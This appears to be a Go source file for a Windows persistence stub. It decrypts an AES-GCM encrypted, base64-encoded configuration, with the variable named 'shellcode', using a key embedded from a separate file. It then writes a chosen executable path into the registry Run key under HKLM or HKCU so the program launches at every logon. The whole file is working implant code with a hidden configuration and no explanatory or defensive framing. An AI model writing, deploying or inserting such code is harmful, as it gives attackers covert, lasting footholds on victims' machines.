//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	_ "embed"
	"encoding/base64"
	"encoding/json"

	"golang.org/x/sys/windows/registry"
)

//go:embed encrypt.txt
var encryptionKey string

var robin string
var RobinConfig RegistryConfig

type RegistryConfig struct {
	Key        string
	Path       string
	Hive       string
	CustomName string
}

func decrypt(encryptionKey string) []byte {
	decoded, _ := base64.StdEncoding.DecodeString(robin)
	h := sha256.New()
	h.Write([]byte(encryptionKey))
	block, _ := aes.NewCipher(h.Sum(nil))
	aesGCM, _ := cipher.NewGCM(block)
	nonceSize := aesGCM.NonceSize()
	nonce, shellcode := decoded[:nonceSize], decoded[nonceSize:]
	plaintext, _ := aesGCM.Open(nil, nonce, shellcode, nil)
	return plaintext
}

func runModify(exePath string, hive string, value string) {
	var regHive registry.Key

	if hive == "HKLM" {
		regHive = registry.LOCAL_MACHINE
	} else {
		regHive = registry.CURRENT_USER
	}

	key, _ := registry.OpenKey(regHive, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
	defer key.Close()

	key.SetStringValue(value, exePath)
}

func main() {
	decrypted := decrypt(encryptionKey)
	json.Unmarshal(decrypted, &RobinConfig)

	executable := RobinConfig.Path
	hive := RobinConfig.Hive
	customValue := RobinConfig.CustomName

	runModify(executable, hive, customValue)
}
